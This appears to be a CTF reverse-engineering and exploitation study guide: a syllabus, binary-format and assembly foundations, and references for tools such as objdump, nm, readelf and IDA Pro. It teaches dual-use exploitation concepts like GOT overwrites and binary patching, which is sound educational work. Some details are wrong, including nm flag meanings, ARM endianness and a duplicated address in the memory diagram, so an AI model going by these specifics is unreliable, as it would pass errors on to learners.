# Syllabus

### Module 1: Foundations

- Binary file formats (ELF, PE, Mach-O)
- Number systems and data representation
- CPU architecture basics (x86, x64, ARM)
- Instruction sets and assembly language fundamentals
- Program memory layout (stack, heap, text, data segments)

### Module 2: Static Analysis Tools

- **objdump** – disassembly and binary inspection
- **strings** – extracting readable strings
- **file** – identifying file types
- **nm** – symbol table examination
- **readelf** – ELF file analysis
- **IDA Pro / Ghidra** – interactive disassemblers
- **Radare2** – framework for binary analysis
- Decompilers (Ghidra decompiler, Hex-Rays)

### Module 3: Dynamic Analysis Tools

- **gdb (GNU Debugger)** – breakpoints, registers, memory inspection
- **lldb** – LLVM debugger
- **strace** – system call tracing
- **ltrace** – library call tracing
- **valgrind** – memory debugging
- Debugger workflows and scripts

### Module 4: Assembly Language Deep Dive

- x86/x64 instruction families (mov, add, sub, jmp, call, ret)
- Stack operations and calling conventions
- Control flow (conditionals, loops, function calls)
- Registers and flags
- Function prologue/epilogue
- Position-independent code (PIC)

### Module 5: Common Protections & Obfuscation

- Address Space Layout Randomization (ASLR)
- Data Execution Prevention (DEP/NX)
- Stack canaries
- Code signing and verification
- Anti-debugging techniques
- Packing and UPX
- Virtualization and emulation-based obfuscation
- Code polymorphism and metamorphism

### Module 6: Cryptanalysis Basics

- Symmetric cryptography recognition
- Hash function identification
- Asymmetric crypto concepts
- Common implementations (OpenSSL, libsodium)
- Weak cryptographic patterns

### Module 7: Vulnerability Classes

- Buffer overflows and stack smashing
- Format string vulnerabilities
- Integer overflows/underflows
- Use-after-free
- Double-free vulnerabilities
- Off-by-one errors
- Return-oriented programming (ROP)

### Module 8: Scripting & Automation

- Python scripting for binary analysis
- **pwntools** library
- Creating custom GDB scripts
- Radare2 scripting (r2pipe)
- Automating exploit generation

### Module 9: Platform-Specific Analysis

- **Linux ELF binaries** – GOT, PLT, relocation
- **Windows PE binaries** – imports, exports, sections
- **Android APK analysis** – Dalvik bytecode
- **Embedded/ARM binaries** – THUMB mode, architecture specifics

### Module 10: Reverse Engineering Workflows

- Identifying main entry point
- Function boundary detection
- Control flow graph reconstruction
- Data flow analysis
- Loop analysis and pattern recognition
- Recognizing compiler-generated code
- Identifying standard library functions

### Module 11: Special Techniques

- Kernel-level debugging (kgdb)
- Hypervisor-level analysis
- Side-channel analysis basics
- Firmware extraction and analysis
- Container and sandbox escape analysis
- Time-based and speculative execution exploits

### Module 12: CTF-Specific Challenges

- Flag extraction and verification
- Forensic RE (finding hidden data)
- Malware analysis (CTF-style)
- Keygen creation and license validation
- Custom protocol reverse engineering
- Constraint solving in binary challenges

### Module 13: Advanced Angr & Symbolic Execution

- **Angr framework** setup and fundamentals
- Path exploration strategies
- State management
- Hooking functions
- Constraint solving

### Module 14: Documentation & Reporting

- Annotating disassembly
- Creating analysis notes
- Documenting findings for teams
- Writing proof-of-concept (PoC) code

---

# Foundations

## Binary File Formats

**ELF (Executable and Linkable Format)**

ELF is the standard executable format on Linux and Unix systems. Understanding its structure is essential for Linux-based CTF challenges.

Structure overview: ELF files begin with a magic number (0x7F 0x45 0x4C 0x46, or ".ELF" in ASCII). The ELF header immediately follows, containing metadata about the file including the architecture (x86, x64, ARM), endianness, entry point address, and offsets to program headers and section headers.

Inspecting ELF files:

```bash
file <binary>
```

This identifies the binary type, architecture, and whether it's stripped (symbols removed) or dynamically/statically linked.

```bash
readelf -h <binary>
```

Displays the ELF header, showing entry point (e_entry), program header offset (e_phoff), and section header offset (e_shoff). The e_machine field indicates architecture (0x03 = Intel 80386, 0x3E = x86-64, 0xB7 = ARM).

```bash
readelf -l <binary>
```

Lists program headers describing how the OS should load the binary into memory. Key segments include PT_LOAD (loadable segments), PT_DYNAMIC (dynamic linking info), PT_INTERP (interpreter path), and PT_NOTE (version/capability info).

```bash
readelf -S <binary>
```

Displays section headers organized into sections like .text (executable code), .data (initialized data), .bss (uninitialized data), .rodata (read-only data), .symtab (symbol table), and .strtab (string table). Stripped binaries have .symtab removed, complicating analysis.

**PE (Portable Executable)**

PE is the Windows executable format, also used on other systems. Its structure differs significantly from ELF.

Structure overview: PE files begin with an MS-DOS header (for backwards compatibility), followed by a PE signature (0x50 0x45, or "PE"), a COFF header (machine type, section count, timestamp), and optional header (architecture-specific data like entry point and section alignment).

Inspecting PE files:

```bash
file <binary>
```

Identifies PE binaries and architecture (x86 vs x64).

```bash
objdump -h <binary>
```

Displays section headers. Common PE sections include .text (code), .data (initialized data), .rsrc (resources), .reloc (relocation info), and .debug (debugging info).

```bash
strings <binary>
```

Extracts readable ASCII strings from the binary. Useful for identifying hardcoded credentials, function names, file paths, or error messages that may leak functionality.

Using Ghidra (cross-platform reverse engineering):

```bash
ghidraRun &
```

Ghidra provides comprehensive PE analysis including automatic function detection, decompilation, and cross-referencing. Import the PE file and use its built-in tools to map program structure.

**Mach-O (Mach Object)**

Mach-O is the native executable format on macOS and iOS. CTF challenges using Mach-O are less common but appear in specialized contests.

Structure overview: Mach-O files begin with a magic number (0xFEEDFACE for 32-bit, 0xFEEDFACF for 64-bit, or FAT magic 0xCAFEBABE for universal binaries containing multiple architectures). The header is followed by load commands describing segments and their memory layout.

Inspecting Mach-O files:

```bash
file <binary>
```

Identifies Mach-O binaries and architecture.

```bash
otool -h <binary>
```

Displays the Mach-O header showing machine type (CPU_TYPE_I386, CPU_TYPE_X86_64, CPU_TYPE_ARM64) and number of load commands.

```bash
otool -l <binary>
```

Lists load commands. Key commands include LC_SEGMENT_64 (memory segments), LC_MAIN (entry point), LC_LOAD_DYLINKER (dynamic linker), and LC_SYMTAB (symbol table location).

```bash
otool -L <binary>
```

Shows dynamic library dependencies similar to ldd on Linux.

```bash
otool -t <binary>
```

Disassembles the __text segment (executable code).

## Number Systems and Data Representation

**Binary, Hexadecimal, and Decimal Conversions**

CTF exploitation requires fluent conversion between these representations.

Binary to decimal: Each bit position represents a power of 2. For example, binary 11010 = (1×2⁴) + (1×2³) + (0×2²) + (1×2¹) + (0×2⁰) = 16 + 8 + 2 = 26 decimal.

Hexadecimal to decimal: Each hex digit represents a power of 16. Hex digits 0-9 represent values 0-9, and A-F represent 10-15. For example, hex 1A = (1×16¹) + (10×16⁰) = 16 + 10 = 26 decimal.

Quick conversions in Python:

```python
# Binary to decimal
int('11010', 2)  # Output: 26

# Hex to decimal
int('1A', 16)  # Output: 26

# Decimal to binary
bin(26)  # Output: '0b11010'

# Decimal to hex
hex(26)  # Output: '0x1a'

# Hex to binary
bin(int('1A', 16))  # Output: '0b11010'
```

Quick conversions in Bash:

```bash
# Decimal to hex
printf "%x\n" 26  # Output: 1a

# Hex to decimal
printf "%d\n" 0x1A  # Output: 26
```

**Endianness**

Endianness determines byte ordering in multi-byte values. This is critical when analyzing memory dumps or network protocols.

Little-endian (most common on x86/x64): The least significant byte is stored at the lowest memory address. For example, the 32-bit value 0x12345678 is stored in memory as: 0x78 0x56 0x34 0x12.

Big-endian (network byte order, used on ARM and some architectures): The most significant byte is stored at the lowest memory address. The same 0x12345678 is stored as: 0x12 0x34 0x56 0x78.

Identifying endianness in binaries:

```bash
readelf -h <binary> | grep "Data"
```

Output shows "little endian" or "big endian".

Endianness implications for exploitation: When constructing buffer overflow payloads or return-oriented programming (ROP) gadgets, the address bytes must be ordered according to the target architecture's endianness. On little-endian systems, a return address of 0x08048000 is written in the buffer as 0x00 0x80 0x04 0x08.

**Fixed-Width Integer Types**

Understanding integer sizes is essential for identifying vulnerabilities like integer overflow or format string bugs.

Standard sizes:

- 8-bit (1 byte): char, int8_t, uint8_t
- 16-bit (2 bytes): short, int16_t, uint16_t
- 32-bit (4 bytes): int, int32_t, uint32_t
- 64-bit (8 bytes): long (on 64-bit systems), long long, int64_t, uint64_t
- Pointer size: 4 bytes on 32-bit systems, 8 bytes on 64-bit systems

Signed vs. unsigned: Signed integers use two's complement representation. A signed 8-bit integer ranges from -128 to 127, while unsigned ranges from 0 to 255. An unsigned integer interpreted as signed (or vice versa) can lead to logic errors exploitable in CTF challenges.

## CPU Architecture Basics

**x86 (32-bit Intel Architecture)**

x86 is foundational for understanding reverse engineering on Intel-based systems. Most older CTF binaries and embedded systems use x86.

Key characteristics:

- 32-bit addresses (4 GB maximum addressable memory)
- 8 general-purpose registers (EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP)
- CISC (Complex Instruction Set Computing) architecture with variable-length instructions
- Stack-based calling conventions (details in later sections)
- Segmentation memory model (largely obsolete in modern systems)

**x64 (64-bit Intel/AMD Architecture)**

x64 is the modern standard on desktop and server systems. Most contemporary CTF challenges target x64.

Key characteristics:

- 64-bit addresses (16 EB maximum addressable memory)
- 16 general-purpose registers (RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP, R8-R15)
- CISC architecture with variable-length instructions
- Simplified calling conventions compared to x86 (System V AMD64 ABI on Linux, Microsoft x64 on Windows)
- Address Space Layout Randomization (ASLR) commonly enabled
- Data Execution Prevention (DEP) commonly enabled

**ARM (Advanced RISC Machine)**

ARM architecture is prevalent in mobile devices, IoT systems, and embedded applications. CTF challenges involving ARM typically appear in IoT or mobile security competitions.

Key characteristics:

- RISC (Reduced Instruction Set Computing) architecture with fixed-width 32-bit instructions (in ARM mode; Thumb mode uses 16-bit instructions)
- 16 general-purpose registers (R0-R15, where R13 is SP, R14 is LR, R15 is PC)
- Load/Store architecture: data manipulation occurs in registers; memory access only through explicit LOAD and STORE instructions
- Multiple register banks for different processor modes (User, FIQ, IRQ, Supervisor, Abort, Undefined)
- Conditional execution: most instructions include condition codes allowing execution to be skipped based on flags

**ARM64 (AArch64)**

ARM64 is the 64-bit evolution of ARM, increasingly used in high-performance mobile and embedded systems.

Key characteristics:

- 31 general-purpose registers (X0-X30, plus XZR the zero register and SP the stack pointer)
- Fixed-width 32-bit instructions
- 128-bit NEON vector registers
- System registers for privileged operations
- Simplified addressing modes compared to 32-bit ARM

## Instruction Sets and Assembly Language Fundamentals

**x86/x64 Assembly Syntax**

Two primary syntaxes exist: Intel and AT&T. Most CTF tooling and documentation use Intel syntax, though Linux tools default to AT&T.

Intel syntax (used in Ghidra, IDA Pro, debuggers on Windows):

```asm
mov eax, 0x1234      ; Move immediate value into EAX
mov ebx, dword [esp] ; Move 32-bit value from memory at ESP
add eax, ebx         ; Add EBX to EAX
jmp 0x08048000       ; Jump to address
```

AT&T syntax (used by GNU tools like GCC, objdump):

```asm
movl $0x1234, %eax      # Move immediate value into EAX
movl (%esp), %ebx       # Move 32-bit value from memory at ESP
addl %ebx, %eax         # Add EBX to EAX
jmp 0x08048000          # Jump to address
```

Key differences: AT&T prefixes immediate values with $ and registers with %, uses suffix to indicate operand size (l for 32-bit, q for 64-bit, b for 8-bit), and reverses operand order (destination comes second).

Common x86/x64 instructions for exploitation:

Data movement: `mov` (copy data), `lea` (load effective address), `xchg` (exchange), `push` (onto stack), `pop` (from stack).

Arithmetic: `add`, `sub`, `inc`, `dec`, `mul`, `div`, `imul` (signed multiply), `idiv` (signed divide).

Logical: `and`, `or`, `xor`, `not`.

Comparison and branching: `cmp` (compare and set flags), `jmp` (unconditional jump), `je`/`jz` (jump if equal/zero), `jne`/`jnz` (jump if not equal/not zero), `jl`/`jg` (jump if less/greater), `call` (call function), `ret` (return from function).

String operations: `movs` (move string), `lods` (load string), `stos` (store string), `rep` (repeat prefix).

**ARM Assembly Fundamentals**

ARM assembly differs significantly from x86 in structure and philosophy.

ARM syntax (GCC/LLVM tools):

```asm
MOV R0, #0x1234     ; Move immediate into R0
LDR R1, [R13]       ; Load from memory address in R13 (SP)
ADD R0, R0, R1      ; Add R1 to R0
B 0x08000000        ; Branch (jump) to address
```

Key ARM instructions for exploitation:

Data movement: `MOV` (move), `MVN` (move negated), `LDR` (load from memory), `STR` (store to memory), `LDRS` (load and sign-extend), `LDRH` (load halfword).

Arithmetic: `ADD`, `SUB`, `MUL`, `SDIV` (signed divide), `UDIV` (unsigned divide).

Logical: `AND`, `ORR` (OR), `EOR` (XOR), `BIC` (bit clear).

Comparison and branching: `CMP` (compare), `B` (unconditional branch), `BEQ` (branch if equal), `BNE` (branch if not equal), `BLT` (branch if less than), `BL` (branch and link—call function), `BX` (branch and exchange—return from function, handles mode switching).

Conditional execution: In ARM, conditions are appended to instructions: `ADDEQ R0, R0, R1` adds only if the Zero flag is set.

**ARM64 Assembly**

ARM64 uses more modern, simplified assembly with 64-bit registers.

ARM64 syntax:

```asm
MOV X0, #0x1234     ; Move immediate into X0 (64-bit)
LDR X1, [SP]        ; Load from stack pointer
ADD X0, X0, X1      ; Add X1 to X0
B 0x400000          ; Branch to address
```

Key ARM64 instructions:

Data movement: `MOV`, `MVN`, `LDR`, `STR`, with automatic 64-bit operation on X registers.

Arithmetic: `ADD`, `SUB`, `MUL`, `SDIV`, `UDIV`.

Logical: `AND`, `ORR`, `EOR`, `EON` (exclusive OR negated).

Comparison and branching: `CMP`, `B`, `B.EQ`, `B.NE`, `B.LT`, `BL` (branch and link), `RET` (return from function).

Load/Store addressing modes are more flexible than 32-bit ARM, supporting immediate offsets, register offsets, and pre/post-indexed addressing.

## Program Memory Layout

**Memory Segments Overview**

Modern binaries use a segmented memory layout with specific purposes for each region. Understanding this layout is critical for buffer overflows, format string bugs, and heap exploitation.

Text segment (.text): Contains executable machine code. This segment is read-only and shared among multiple processes running the same binary (memory efficiency). In compiled binaries, the text segment begins at the lowest addresses (traditionally 0x08048000 on 32-bit Linux, randomized on modern systems with ASLR).

Data segment (.data): Contains global and static variables that are explicitly initialized. For example, `int global_var = 5;` resides in .data. This segment is read-write and per-process. In CTF challenges, overwriting data segment variables can alter program behavior.

BSS segment (.bss): Contains global and static variables that are uninitialized or explicitly zero-initialized. For example, `int global_array[1000];` resides in .bss. Unlike .data, .bss doesn't store actual data in the binary file; instead, it records the size, and the loader zeros this memory at runtime (reducing binary size).

Rodata segment (.rodata): Contains read-only data including string literals, constant arrays, and compiler-generated constants. Strings printed with `printf("Hello");` are in .rodata.

Heap: Dynamically allocated memory grows upward (toward higher addresses). The heap base is set by the loader and can be manipulated with brk() and mmap() system calls. CTF challenges often involve heap exploitation to corrupt heap metadata or allocate adjacent objects.

Stack: Local variables, function arguments, and return addresses reside on the stack. The stack grows downward (toward lower addresses on most systems) and is per-thread. Stack overflows are a primary exploitation vector in CTF.

Memory layout visualization (typical 32-bit system):

```
0xFFFFFFFF  +------------------+
            | Kernel (unmapped) |
            +------------------+
0xC0000000  | Memory-mapped I/O |
            +------------------+
            | Stack (grows down)|
            |        |          |
            |        v          |
            +------------------+
            | (gap)            |
            +------------------+
            |        ^          |
            |        |          |
            | Heap (grows up)  |
            +------------------+
0x08048000  | .data, .bss      |
            +------------------+
            | .rodata          |
            +------------------+
            | .text            |
0x08048000  +------------------+
```

With Address Space Layout Randomization (ASLR) enabled, all segment addresses are randomized, complicating exploitation.

**Stack Frame Organization**

Function calls create stack frames organizing local data and return information.

x86 32-bit stack frame (System V calling convention):

Before a function is called, arguments are pushed onto the stack from right to left (reverse order). Upon entering the function, the CPU executes `call`, which pushes the return address. The function prologue then executes `push ebp` (save the previous frame pointer) and `mov ebp, esp` (set up the new frame pointer).

Stack frame layout:

```
[ESP + 12] [Argument 3]
[ESP + 8]  [Argument 2]
[ESP + 4]  [Argument 1]
[ESP + 0]  [Return Address]
[EBP - 4]  [Local Variable 1]
[EBP - 8]  [Local Variable 2]
...
[EBP]      [Previous EBP]
```

A function accesses arguments via `mov eax, [ebp+8]` for the first argument and locals via `mov eax, [ebp-4]` for the first local variable.

x64 64-bit stack frame (System V AMD64 ABI):

The first six integer arguments are passed in registers (RDI, RSI, RDX, RCX, R8, R9), not on the stack. Additional arguments are passed on the stack. The return address is pushed by `call`.

Stack frame layout:

```
[RSP + 8]  [Argument 7]
[RSP + 0]  [Return Address]
[RBP - 8]  [Local Variable 1]
[RBP - 16] [Local Variable 2]
...
[RBP]      [Previous RBP]
```

Importantly, x64 reserves a 128-byte "red zone" below RSP that is not clobbered by signal handlers or interrupt handlers, allowing leaf functions (functions that don't call other functions) to use this space for local variables without adjusting RSP.

x64 Microsoft x64 calling convention (Windows):

The first four integer arguments are passed in RCX, RDX, R8, R9. Additional arguments are passed on the stack. The caller must reserve 32 bytes of "shadow space" on the stack for the callee's use.

**Heap Memory Organization**

The heap is a large contiguous memory region managed by allocators like malloc. Understanding heap structure is essential for heap exploitation challenges.

Malloc metadata: Most malloc implementations store metadata (chunk size, allocation status) adjacent to user data. For glibc malloc, each allocated chunk has a header containing size and flags.

Chunk structure (simplified):

```
[Previous Chunk Size] (if freed)
[Chunk Size | Flags]
[User Data ...]
[Padding to alignment]
```

The flags include whether the chunk is allocated (ALLOCATED flag) and whether the previous chunk is freed (PREV_INUSE flag).

Free list: When a chunk is freed, it's added to a free list. Subsequent allocations can reuse freed memory. Corrupting free list pointers is a common heap exploitation technique.

Common heap vulnerabilities exploitable in CTF:

Use-after-free: Accessing memory after it's been freed. If the freed memory is reallocated, the attacker can control the content accessed.

Heap overflow: Writing beyond the boundaries of an allocated chunk, potentially corrupting adjacent chunk metadata or data.

Double-free: Freeing the same pointer twice, potentially corrupting the free list.

Tools for analyzing heap layout in glibc:

```bash
gdb <binary>
(gdb) b <allocation_point>
(gdb) run
(gdb) heap
(gdb) heap chunk <address>
```

(This requires GDB plugins like gdb-heap or pwn-gdb.)

Alternatively, compile with AddressSanitizer to detect heap errors:

```bash
gcc -fsanitize=address -g <source.c> -o <binary>
```

This instruments the binary to detect heap errors at runtime, invaluable during development of exploits.

**Global Offset Table (GOT) and Procedure Linkage Table (PLT)**

Dynamic linking requires resolution of external function addresses at runtime. GOT and PLT facilitate this.

GOT (Global Offset Table): Contains the actual addresses of dynamically linked functions. This table is writable and per-process.

PLT (Procedure Linkage Table): Contains small code stubs that resolve function addresses on first call. Subsequent calls jump directly to the resolved address in GOT.

Exploitation implications: Overwriting a GOT entry allows redirecting function calls. For example, overwriting `malloc@GOT` with the address of a malicious function causes all `malloc` calls to execute the attacker's code.

Inspecting GOT and PLT:

```bash
objdump -R <binary> | grep -E "JUMP|GLOB_DAT"
```

Shows GOT relocations.

```bash
objdump -d <binary> | grep -A5 "@plt"
```

Shows PLT stubs. Each stub jumps to GOT; on the first call, GOT contains a pointer back to PLT for lazy binding.

This foundation module establishes the conceptual and technical basis for all subsequent reverse engineering and exploitation work in CTF challenges. Mastery of binary formats, number systems, architecture basics, assembly language, and memory layout directly enables effective vulnerability discovery and exploitation.

---

# Static Analysis Tools

## objdump – Disassembly and Binary Inspection

**Purpose**: objdump disassembles executable binaries and object files, displaying assembly code, section headers, and symbol information. Essential for understanding binary structure without execution.

**Core Syntax**

```bash
objdump [options] <binary>
```

**Critical Flags for CTF Exploitation**

`-d` – Disassemble executable sections

```bash
objdump -d ./binary
```

Displays all executable code with addresses, machine opcodes, and mnemonics. Use for identifying function prologues, returns, and control flow.

`-D` – Disassemble all sections

```bash
objdump -D ./binary
```

Includes non-executable sections (.data, .rodata). Useful for finding embedded shellcode, ROP gadgets in unusual locations, or hardcoded values.

`-S` – Mix source code with disassembly

```bash
objdump -S ./binary
```

[Unverified] Displays original source lines alongside assembly when debug symbols present. Requires binaries compiled with `-g` flag.

`-t` – Symbol table

```bash
objdump -t ./binary
```

Lists all symbols with addresses and sizes. Reveals function locations, global variables, and imported functions before analyzing disassembly.

`-T` – Dynamic symbol table

```bash
objdump -T ./binary
```

Shows runtime-linked symbols for dynamically linked binaries. Critical for identifying PLT (Procedure Linkage Table) entries and GOT (Global Offset Table) addresses.

`-R` – Relocation entries

```bash
objdump -R ./binary
```

Displays relocation information. [Inference] Useful for identifying where addresses are patched during linking or loading, relevant for ASLR bypass techniques.

**Advanced Combinations for Exploitation**

Identify all function calls:

```bash
objdump -d ./binary | grep "call"
```

Locates function call sites for tracing execution flow and identifying vulnerable functions.

Extract ROP gadgets (basic approach):

```bash
objdump -d ./binary | grep -E "ret|pop|mov" | head -20
```

[Inference] While sophisticated ROP chain generation requires dedicated tools (like ROPgadget), this identifies return-oriented programming opportunities in code flow.

View specific section:

```bash
objdump -s -j .rodata ./binary
```

Hexdump specific sections for finding format strings, hardcoded addresses, or data structures.

**Linux vs. Windows Context**

Linux (ELF): objdump directly processes ELF binaries. Use `-T` to examine dynamic symbols, critical for GOT overwrite exploits.

Windows (PE): objdump processes PE files but with limitations. [Inference] For detailed Windows binary analysis, tools like `objdump` work on PE executables, though IDA Pro or Ghidra provide superior Windows-specific analysis.

---

## strings – Extracting Readable Strings

**Purpose**: Extracts human-readable ASCII and Unicode strings from binary files. Reveals hardcoded credentials, format strings, error messages, file paths, and other plaintext data.

**Core Syntax**

```bash
strings [options] <binary>
```

**Essential Flags for CTF**

`-a` – Search entire file

```bash
strings -a ./binary
```

By default, strings analyzes all sections. Use explicitly when behavior seems limited.

`-n <length>` – Minimum string length

```bash
strings -n 6 ./binary
```

Filters output to strings at least 6 characters. Reduces noise from 1-2 character artifacts; adjust threshold based on target program.

`-t x` – Show hex offsets

```bash
strings -t x ./binary
```

Displays hexadecimal file offset for each string. Essential for locating strings in binary sections during exploitation (shellcode injection, format string attacks).

`-t d` – Show decimal offsets

```bash
strings -t d ./binary
```

Decimal offsets useful for address calculations on some architectures.

**Practical CTF Applications**

Identify format string vulnerabilities:

```bash
strings -a ./binary | grep "%"
```

Format strings like `%x`, `%s`, `%n` indicate vulnerable printf-family functions. Locate these in binary to confirm format string bug presence.

Find hardcoded credentials or flags:

```bash
strings ./binary | grep -iE "password|flag|key|secret"
```

Many CTF binaries contain unencrypted sensitive data in plaintext.

Locate buffer overflow hints:

```bash
strings -n 8 ./binary | grep -E "^[a-zA-Z]{20,}"
```

[Inference] Long repetitive strings may indicate padding or canary values; unusual long strings sometimes hint at overflow test patterns.

Extract all strings with context:

```bash
strings -t x ./binary > /tmp/strings_output.txt
```

Saves to file for systematic analysis or searching alongside disassembly output.

**Linux-Specific Considerations**

On 32-bit binaries, strings frequently reveals runtime libc calls and PLT entries. On 64-bit, strings output is often more concise due to different calling conventions and optimizations.

---

## file – Identifying File Types

**Purpose**: Determines binary format, architecture, and compilation characteristics. Essential first step in exploitation to confirm target type before selecting tools.

**Core Syntax**

```bash
file <binary>
```

**Interpreting Output**

Standard output example:

```
./binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=..., not stripped
```

**Critical Information Extracted**

**Format**: ELF (Linux), PE (Windows), Mach-O (macOS)

- Determines applicable exploitation techniques and tool compatibility.

**Architecture**: x86-64, x86, ARM, ARM64, MIPS

- Dictates assembly syntax, register usage, and ROP gadget availability.

**Linking**: Dynamically linked vs. statically linked

- Dynamically linked: exploitable PLT/GOT structures; requires libc knowledge.
- Statically linked: larger binary; no external library calls to leverage.

**Stripped vs. Not stripped**

- Not stripped: symbols present; easier debugging and function identification.
- Stripped: symbols removed; increases analysis difficulty; requires pattern matching for function discovery.

**ASLR and PIE Detection**

```bash
file ./binary | grep -i "pie\|shared"
```

[Inference] PIE (Position Independent Executable) or "shared object" indicates ASLR applies; requires address leak exploits or ROP chains bypassing ASLR.

**Verbose Output**

```bash
file -v ./binary
```

Displays additional file format details and magic byte information.

**Practical CTF Workflow**

Quick exploitation planning:

```bash
file ./binary && objdump -t ./binary | head && strings -n 8 ./binary | head
```

Combines file type, symbol table, and strings for rapid target assessment.

---

## nm – Symbol Table Examination

**Purpose**: Lists symbols (functions, variables, labels) from object files and executables. Reveals binary structure for both static and dynamic linking scenarios.

**Core Syntax**

```bash
nm [options] <binary>
```

**Essential Flags for Exploitation**

`-d` – Dynamic symbols only

```bash
nm -d ./binary
```

Shows symbols resolved at runtime (external functions). Critical for identifying imported libc functions used in exploitation chains.

`-D` – Dynamic symbol table (equivalent to `-d`)

```bash
nm -D ./binary
```

`-t x` – Hex format addresses

```bash
nm -t x ./binary
```

Displays symbol addresses in hexadecimal, useful for cross-referencing with disassembly output.

`-C` – Demangle C++ symbols

```bash
nm -C ./binary
```

Converts mangled C++ function names to readable form. [Inference] Essential for C++ binaries where symbol names are encoded; reveals actual function signatures.

`-s` – Print symbol size

```bash
nm -s ./binary
```

Shows byte size of each symbol. Useful for estimating buffer sizes or data structure dimensions.

**Symbol Type Indicators**

Output format: `address type symbol_name`

Common type indicators:

- **T** – Symbol in text (code) section; executable function
- **D** – Symbol in data section; global variable with initialization
- **B** – Symbol in BSS section; uninitialized global variable
- **U** – Undefined symbol; external reference requiring linking
- **W** – Weak symbol; optional linkage

**Practical CTF Applications**

Identify all functions:

```bash
nm ./binary | grep " T " | awk '{print $3}'
```

Lists executable functions. Cross-reference with disassembly to find vulnerable functions.

Find global variables:

```bash
nm -D ./binary | grep -E " [DB] "
```

Locates global data for heap/stack overflow targets or to identify exploit input buffers.

Detect libc function imports:

```bash
nm -D ./binary | grep "printf\|strcpy\|gets"
```

[Inference] Identifies dangerous libc functions commonly exploited; if present and imported, likely used internally by binary.

Map symbol addresses for GDB breakpoints:

```bash
nm ./binary | grep "main" | awk '{print $1}'
```

Extracts main function address for setting breakpoints during dynamic analysis.

**Dynamic vs. Static Linking Analysis**

Statically linked binary:

```bash
nm ./binary | grep " T " | wc -l
```

Large symbol count indicates static linking; all code present in binary.

Dynamically linked binary:

```bash
nm -D ./binary | head -20
```

Shows only external dependencies; internal functions often stripped in production binaries.

**Linux-Specific Context**

On Linux, nm reads ELF symbol tables. Combined with `readelf`, provides complete binary metadata for exploitation planning. [Inference] On stripped binaries, nm shows minimal output; use `objdump -d` and pattern matching as alternative approach.

---

## readelf – ELF File Analysis

**Purpose**: Parse and display information about ELF (Executable and Linkable Format) binaries on Linux systems.

### Core Commands

```bash
# Display ELF header
readelf -h binary

# Show section headers
readelf -S binary

# List program headers/segments
readelf -l binary

# Display symbol table
readelf -s binary

# Show dynamic section (shared libraries, RPATH, etc.)
readelf -d binary

# Display relocations
readelf -r binary

# Show notes section (build ID, ABI info)
readelf -n binary

# Dump hex content of specific section
readelf -x .text binary
readelf -x .rodata binary

# Display all information (verbose)
readelf -a binary
```

### CTF-Specific Usage

**Identify PIE (Position Independent Executable)**:

```bash
readelf -h binary | grep Type
# Output: DYN (Shared object file) = PIE enabled
# Output: EXEC (Executable file) = PIE disabled
```

**Find Stack Protection**:

```bash
readelf -s binary | grep stack_chk
# Presence of __stack_chk_fail indicates stack canaries
```

**Extract Embedded Strings from Specific Sections**:

```bash
readelf -p .rodata binary
# Displays printable strings in read-only data section
```

**Check for Debugging Symbols**:

```bash
readelf -S binary | grep debug
# Sections like .debug_info indicate non-stripped binary
```

**Analyze RELRO (Relocation Read-Only)**:

```bash
readelf -l binary | grep GNU_RELRO
# Partial RELRO: RELRO present, GOT writable
# Full RELRO: Entire GOT read-only after loading
```

### Key Sections and Their Purposes

|Section|Purpose|
|---|---|
|`.text`|Executable code|
|`.rodata`|Read-only data (strings, constants)|
|`.data`|Initialized writable data|
|`.bss`|Uninitialized data|
|`.plt` / `.got`|Procedure Linkage Table / Global Offset Table (dynamic linking)|
|`.init` / `.fini`|Constructors / destructors|
|`.dynsym`|Dynamic symbol table|

### Limitations

- ELF-specific (Linux/Unix); cannot analyze PE (Windows) or Mach-O (macOS) files
- Does not perform disassembly or control flow analysis
- Cannot detect obfuscation techniques beyond basic inspection

---

## IDA Pro – Interactive Disassembler (Commercial)

**Purpose**: Industry-standard disassembler with advanced analysis, graphing, and decompilation capabilities.

### Core Features

**Loading Binaries**:

- Auto-analysis on load (configurable)
- Supports x86, x64, ARM, MIPS, PowerPC, and 50+ architectures
- Recognizes function prologues, references, and creates cross-references (xrefs)

**Essential Views**:

- **IDA View**: Disassembly graph or text mode (spacebar toggles)
- **Hex View**: Raw bytes
- **Pseudocode**: Decompiled C-like code (requires Hex-Rays decompiler)
- **Functions Window**: All identified functions
- **Strings Window** (Shift+F12): Embedded strings

### Key Shortcuts

|Shortcut|Action|
|---|---|
|`G`|Jump to address|
|`N`|Rename variable/function|
|`X`|Cross-references to address|
|`Tab`|Switch between graph/text view|
|`Spacebar`|Toggle graph mode|
|`F5`|Decompile function (Hex-Rays)|
|`;`|Add comment|
|`Y`|Change function/variable type|
|`U`|Undefine code/data|
|`C`|Convert to code|
|`D`|Convert to data|
|`A`|Convert to string|

### CTF Techniques

**Function Identification**:

```c
// IDA auto-recognizes common functions
// Rename unfamiliar functions:
// Place cursor on function, press N, enter descriptive name
```

**String Cross-Referencing**:

1. Open Strings window (Shift+F12)
2. Find interesting string (e.g., "flag{", "password")
3. Double-click → jumps to data section
4. Press `X` → shows where string is referenced in code

**Patching Binaries**:

- Edit → Patch program → Change byte
- Useful for bypassing checks (e.g., `jz` → `jmp`)
- Export patched binary: Edit → Patch program → Apply patches to input file

**Scripting (IDAPython)**:

```python
# Example: Find all calls to a specific function
import idaapi

target_func = 0x401000
for xref in XrefsTo(target_func):
    print(hex(xref.frm))
```

### Hex-Rays Decompiler

**Purpose**: Converts assembly to pseudocode for easier analysis.

**Usage**:

- Press `F5` in any function
- Right-click variables to rename, retype
- Simplifies complex logic but may misinterpret obfuscated code

**Limitations**:

- [Inference] Decompilation accuracy depends on compiler optimizations and obfuscation
- May not handle hand-written assembly or anti-disassembly tricks correctly

---

## Ghidra – Open-Source Alternative

**Purpose**: NSA-developed reverse engineering suite with integrated decompiler, debugger support, and collaborative features.

### Installation & Setup

```bash
# Install Ghidra (requires Java 17+)
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_X.X_build/ghidra_X.X_PUBLIC_YYYYMMDD.zip
unzip ghidra_*.zip
cd ghidra_*/
./ghidraRun
```

### Project Workflow

1. **Create Project**: File → New Project → Non-Shared Project
2. **Import Binary**: File → Import File → Select target
